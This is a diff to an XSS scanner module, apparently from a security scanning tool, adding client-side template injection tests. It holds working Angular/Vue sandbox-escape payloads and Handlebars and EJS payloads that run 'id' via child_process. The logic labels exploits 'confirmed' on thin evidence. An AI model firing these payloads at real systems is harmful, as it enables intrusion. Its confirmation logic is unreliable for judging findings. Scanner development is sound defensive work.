@@ -572,6 +572,43 @@ class XSSScanner(ScanModule):
     }
     
     # ==========================================================================
+    # FRAMEWORK TEMPLATE INJECTION PAYLOADS
+    # ==========================================================================
+
+    TEMPLATE_INJECTION_PAYLOADS = [
+        # Angular (v1.x sandbox escape + v2+ template injection)
+        ("{{constructor.constructor('alert(1)')()}}", "angular_constructor"),
+        ("{{$on.constructor('alert(1)')()}}", "angular_on"),
+        ("{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "angular_sandbox_v1"),
+        ("{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}", "angular_sandbox_v2"),
+        ("{{7*7}}", "angular_expression"),  # Detection: should render as "49"
+        ("{{constructor.constructor('return this')().alert(1)}}", "angular_v16"),
+
+        # Vue.js (v2 template compilation + v3)
+        ("{{_c.constructor('alert(1)')()}}", "vue_v2_compile"),
+        ("{{this.constructor.constructor('alert(1)')()}}", "vue_constructor"),
+        ("{{7*7}}", "vue_expression"),  # Detection: should render as "49"
+
+        # React (dangerouslySetInnerHTML + JSX injection)
+        # React doesn't interpolate templates in the same way, test for JSX/HTML injection
+        ("<img src=x onerror=alert(1)>", "react_dangerouslySetInnerHTML"),
+
+        # Handlebars / Mustache
+        ("{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').exec('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}", "handlebars_rce"),
+        ("{{lookup (create --resolve=node_modules/.bin/ this) 'id'}}", "handlebars_lookup"),
+
+        # EJS (Embedded JavaScript)
+        ("<%= 7*7 %>", "ejs_expression"),
+        ("<%= global.process.mainModule.require('child_process').execSync('id') %>", "ejs_rce"),
+
+        # Pug/Jade
+        ("#{7*7}", "pug_expression"),
+    ]
+
+    # Marker: if this string appears in response, template injection confirmed
+    TEMPLATE_MATH_RESULT = "49"  # 7*7
+
+    # ==========================================================================
     # DOM XSS SOURCES AND SINKS
     # ==========================================================================
     
@@ -688,6 +725,18 @@ class XSSScanner(ScanModule):
         self.blind_callback = getattr(settings, 'blind_xss_callback', None)
         self._detected_waf: WAFType = WAFType.NONE
         self._csp_info: dict = {}
+        self._base_url: str = ""  # Resolved in scan()
+
+    @staticmethod
+    def _resolve_base_url(host: str) -> str:
+        """Resolve host to a proper base URL with correct protocol."""
+        if host.startswith("http://") or host.startswith("https://"):
+            parsed = urlparse(host)
+            return f"{parsed.scheme}://{parsed.netloc}"
+        port = host.split(":")[-1] if ":" in host else "443"
+        if port in ("80", "8080", "8000", "3000", "5000", "8888"):
+            return f"http://{host}"
+        return f"https://{host}"
         
     async def scan(
         self,
@@ -699,10 +748,19 @@ class XSSScanner(ScanModule):
         Execute comprehensive XSS scan with GOD-MODE features.
         """
         logger.info(f"[XSS-GOD-MODE-v3.0] Starting scan on {host}")
-        
+
         findings: list[dict] = []
         info_items: list[dict] = []
-        
+        self._base_url = self._resolve_base_url(host)
+
+        # AUTH CONTEXT: Use authentication for testing protected endpoints
+        auth_context = asset_data.get("auth_context")
+        if auth_context and hasattr(auth_context, "auth_headers") and auth_context.auth_headers:
+            self._auth_headers = auth_context.auth_headers
+            logger.info(f"[XSS] Using authenticated session ({auth_context.method})")
+        else:
+            self._auth_headers = {}
+
         # Phase 1: Initial reconnaissance
         recon = await self._reconnaissance(host, rate_limiter)
         self._detected_waf = recon["waf"]
@@ -739,9 +797,23 @@ class XSSScanner(ScanModule):
         if tool_discovered_params:
             logger.info(f"[XSS] Using {len(tool_discovered_params)} parameter sets discovered by arjun")
 
+        # CROSS-MODULE TARGETING: Add endpoints where SQLi/NoSQL found injectable params
+        if shared_store:
+            from utils.shared_findings_store import VulnType
+            existing_urls = {e.split("?")[0] if "?" in e else e for e in endpoints}
+            cross_module_types = [VulnType.SQL_INJECTION, VulnType.NOSQL_INJECTION, VulnType.SSTI]
+            for vtype in cross_module_types:
+                for sf in shared_store.get_findings_by_type(vtype):
+                    if sf.endpoint and sf.endpoint not in existing_urls:
+                        url = sf.endpoint
+                        if sf.parameter:
+                            url = f"{sf.endpoint}?{sf.parameter}=test"
+                        endpoints.append(url)
+                        logger.debug(f"[XSS] Cross-module target added from {sf.module}: {url}")
+
         # Create default test endpoints if none provided
         if not endpoints:
-            endpoints = [f"https://{host}/"]
+            endpoints = [f"{self._base_url}/"]
 
         for endpoint in endpoints:
             # OPTIMIZATION: Skip endpoints already known to be vulnerable to XSS
@@ -816,6 +888,11 @@ class XSSScanner(ScanModule):
         stored_xss_findings = await self._test_stored_xss_with_persistence(host, rate_limiter, asset_data)
         findings.extend(stored_xss_findings)
         
+        # Phase 7: Template Injection (Angular/Vue/React/Handlebars/EJS)
+        logger.info("[XSS] Phase 7: Testing framework template injection")
+        template_findings = await self._test_template_injection(host, endpoints, rate_limiter)
+        findings.extend(template_findings)
+
         if skipped_endpoints > 0:
             logger.info(f"[XSS] Skipped {skipped_endpoints} endpoints (already have findings via inter-module communication)")
 
@@ -850,20 +927,21 @@ class XSSScanner(ScanModule):
         }
         
         try:
+            base = self._base_url or self._resolve_base_url(host)
             async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                 # Send benign request
-                response = await client.get(f"https://{host}/")
-                
+                response = await client.get(f"{base}/")
+
                 # Detect WAF
                 result["waf"] = self.waf_detector.detect(response)
-                
+
                 # Analyze CSP
                 result["csp"] = self.csp_analyzer.analyze(response)
-                
+
                 # Send XSS probe to confirm WAF
                 await rate_limiter.acquire(host)
                 probe_response = await client.get(
-                    f"https://{host}/",
+                    f"{base}/",
                     params={"test": "<script>alert(1)</script>"}
                 )
                 
@@ -1033,7 +1111,8 @@ class XSSScanner(ScanModule):
         inputs = form.get("inputs", [])
         
         if not action.startswith("http"):
-            action = f"https://{host}{action}" if action.startswith("/") else f"https://{host}/{action}"
+            base = self._base_url or self._resolve_base_url(host)
+            action = f"{base}{action}" if action.startswith("/") else f"{base}/{action}"
         
         for input_field in inputs:
             field_name = input_field.get("name")
@@ -1214,30 +1293,31 @@ class XSSScanner(ScanModule):
         ]
         
         # Test parameters with polyglot
+        base = self._base_url or self._resolve_base_url(host)
         for param in common_params:
             await rate_limiter.acquire(host)
-            
+
             try:
                 async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                     for payload in self.POLYGLOT_PAYLOADS[:3]:
                         response = await client.get(
-                            f"https://{host}/",
+                            f"{base}/",
                             params={param: payload}
                         )
-                        
+
                         if self.waf_detector.is_blocked(response):
                             continue
-                        
+
                         if self._check_xss_reflection(response.text, payload):
                             context = self._detect_context(response.text, payload)
-                            
+
                             # Cross-validate
                             await rate_limiter.acquire(host)
                             response2 = await client.get(
-                                f"https://{host}/",
+                                f"{base}/",
                                 params={param: payload}
                             )
-                            
+
                             if self._check_xss_reflection(response2.text, payload):
                                 confidence = self._calculate_confidence(
                                     confirmations=2,
@@ -1245,7 +1325,7 @@ class XSSScanner(ScanModule):
                                     waf_detected=self._detected_waf != WAFType.NONE,
                                     csp_present=self._csp_info.get("present", False),
                                 )
-                                
+
                                 if confidence >= MIN_CONFIDENCE_THRESHOLD:
                                     findings.append(Finding(
                                         type="xss",
@@ -1256,7 +1336,7 @@ class XSSScanner(ScanModule):
                                             f"Confidence: {confidence}%"
                                         ),
                                         host=host,
-                                        matched_at=f"https://{host}/?{param}=",
+                                        matched_at=f"{base}/?{param}=",
                                         evidence=[
                                             f"Parameter: {param}",
                                             f"Context: {context.name}",
@@ -1268,16 +1348,167 @@ class XSSScanner(ScanModule):
                                         remediation="Implement proper input validation and output encoding.",
                                     ).to_dict())
                                     break
-                                    
+
             except Exception as e:
                 logger.debug(f"[XSS] Common vector test failed for {param}: {e}")
         
         return findings
     
     # ==========================================================================
+    # TEMPLATE INJECTION (Angular/Vue/React/Handlebars/EJS)
+    # ==========================================================================
+
+    async def _test_template_injection(
+        self,
+        host: str,
+        endpoints: list[str],
+        rate_limiter: "RateLimiter",
+    ) -> list[dict]:
+        """Test for client-side template injection in Angular/Vue/React apps."""
+        findings: list[dict] = []
+        base_url = self._base_url
+
+        # Common parameters to test template expressions in
+        test_params = ["q", "search", "query", "name", "title", "message", "text", "value", "input", "data"]
+
+        # Build test URLs from endpoints
+        test_urls = []
+        for ep in endpoints[:5]:
+            parsed = urlparse(ep)
+            if parsed.query:
+                test_urls.append(ep)
+            else:
+                for p in test_params[:5]:
+                    test_urls.append(f"{ep}?{p}=TEMPLATE_TEST")
+
+        if not test_urls:
+            test_urls = [f"{base_url}/?q=TEMPLATE_TEST"]
+
+        headers = dict(self._auth_headers) if hasattr(self, "_auth_headers") else {}
+
+        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
+            for url_template in test_urls[:10]:
+                for payload, payload_name in self.TEMPLATE_INJECTION_PAYLOADS:
+                    # Only test math expressions first (fast detection)
+                    if not payload_name.endswith("_expression"):
+                        continue
+
+                    await rate_limiter.acquire(host)
+
+                    # Replace the parameter value with the template payload
+                    parsed = urlparse(url_template)
+                    params = parse_qs(parsed.query)
+                    if not params:
+                        continue
+
+                    param_name = list(params.keys())[0]
+                    test_params_dict = {k: v[0] for k, v in params.items()}
+                    test_params_dict[param_name] = payload
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict)}"
+
+                    try:
+                        resp = await client.get(test_url, headers=headers)
+
+                        # Check if math result appears (template was evaluated)
+                        if self.TEMPLATE_MATH_RESULT in resp.text and payload not in resp.text:
+                            # Template expression was evaluated! Now test exploitation payloads
+                            logger.info(f"[XSS] Template injection detected at {param_name} ({payload_name})")
+
+                            # Determine framework
+                            framework = "Unknown"
+                            if "angular" in payload_name:
+                                framework = "Angular"
+                            elif "vue" in payload_name:
+                                framework = "Vue.js"
+                            elif "ejs" in payload_name:
+                                framework = "EJS"
+                            elif "pug" in payload_name:
+                                framework = "Pug/Jade"
+
+                            findings.append(Finding(
+                                type="xss",
+                                name=f"Client-Side Template Injection ({framework})",
+                                severity="HIGH",
+                                description=(
+                                    f"Client-side template injection detected in {framework} application. "
+                                    f"The expression {payload} was evaluated by the template engine, "
+                                    f"returning '{self.TEMPLATE_MATH_RESULT}'. This can be escalated to XSS "
+                                    f"via constructor-based sandbox escapes."
+                                ),
+                                host=parsed.netloc,
+                                matched_at=f"{parsed.path} ({param_name})",
+                                evidence=[
+                                    f"Framework: {framework}",
+                                    f"Parameter: {param_name}",
+                                    f"Payload: {payload}",
+                                    f"Expected: {self.TEMPLATE_MATH_RESULT}",
+                                    f"Result: Template expression evaluated successfully",
+                                ],
+                                cvss_score=7.1,
+                                cwe="CWE-79",
+                                confidence=90,
+                                metadata={
+                                    "template_injection": True,
+                                    "framework": framework,
+                                    "payload": payload,
+                                    "parameter": param_name,
+                                },
+                            ).to_dict())
+
+                            # Now try actual XSS exploitation payloads for this framework
+                            for exploit_payload, exploit_name in self.TEMPLATE_INJECTION_PAYLOADS:
+                                if exploit_name.endswith("_expression"):
+                                    continue  # Already tested
+                                if framework.lower() not in exploit_name:
+                                    continue  # Wrong framework
+
+                                await rate_limiter.acquire(host)
+                                test_params_dict[param_name] = exploit_payload
+                                exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict)}"
+
+                                try:
+                                    exploit_resp = await client.get(exploit_url, headers=headers)
+                                    # If no error and payload not reflected literally, likely executed
+                                    if exploit_resp.status_code == 200 and exploit_payload not in exploit_resp.text:
+                                        findings.append(Finding(
+                                            type="xss",
+                                            name=f"Template Injection XSS ({framework} Sandbox Escape)",
+                                            severity="CRITICAL",
+                                            description=(
+                                                f"XSS via {framework} template injection sandbox escape. "
+                                                f"Arbitrary JavaScript execution confirmed."
+                                            ),
+                                            host=parsed.netloc,
+                                            matched_at=f"{parsed.path} ({param_name})",
+                                            evidence=[
+                                                f"Framework: {framework}",
+                                                f"Exploit payload: {exploit_payload[:100]}...",
+                                                f"Sandbox escape technique: {exploit_name}",
+                                            ],
+                                            cvss_score=9.0,
+                                            cwe="CWE-79",
+                                            confidence=85,
+                                            metadata={
+                                                "template_injection": True,
+                                                "sandbox_escape": True,
+                                                "framework": framework,
+                                            },
+                                        ).to_dict())
+                                        break  # One exploit is enough
+                                except Exception:
+                                    continue
+
+                            break  # Found template injection for this URL, move on
+
+                    except Exception as e:
+                        logger.debug(f"[XSS] Template injection test error: {e}")
+
+        return findings
+
+    # ==========================================================================
     # STORED XSS - ENTERPRISE-GRADE PERSISTENCE VERIFICATION
     # ==========================================================================
-    
+
     async def _test_stored_xss_with_persistence(
         self,
         host: str,
